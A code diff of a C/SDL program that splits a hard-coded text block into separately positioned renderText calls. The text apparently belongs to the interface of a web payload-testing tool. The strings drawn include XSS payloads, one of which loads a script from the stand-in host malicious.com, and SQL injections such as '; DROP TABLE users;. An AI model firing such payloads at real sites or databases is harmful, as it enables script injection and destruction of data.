@@ -32,8 +32,26 @@ int main(int argc, char* argv[]) {
         SDL_RenderClear(renderer);
 
         // Render GET request and payloads with basic text rendering
-        renderText(renderer, "GET / HTTP/2.0\nHost: example.com", 20, 20, black);
-        renderText(renderer, "XSS Payloads:\n\"><script>alert(1)</script>\n<script>console.log('xss')</script>\n<script src='http://malicious.com/x.js'></script>\nSQL Injections:\n' OR '1'='1\n' OR 1=1--\n'; DROP TABLE users;", 20, 320, black);
+        int yPos = 20;
+        renderText(renderer, "GET / HTTP/2.0", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "Host: example.com", 20, yPos, black);
+        yPos += 40; // Increase space before rendering XSS payloads
+        renderText(renderer, "XSS Payloads:", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "\"> <script>alert(1)</script>", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "<script>console.log('xss')</script>", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "<script src='http://malicious.com/x.js'></script>", 20, yPos, black);
+        yPos += 40; // Space before SQL Injections
+        renderText(renderer, "SQL Injections:", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "' OR '1'='1", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "' OR 1=1--", 20, yPos, black);
+        yPos += 20;
+        renderText(renderer, "'; DROP TABLE users;", 20, yPos, black);
 
         // Render buttons with text
         SDL_SetRenderDrawColor(renderer, 0, 0, 255, 255); // Blue buttons
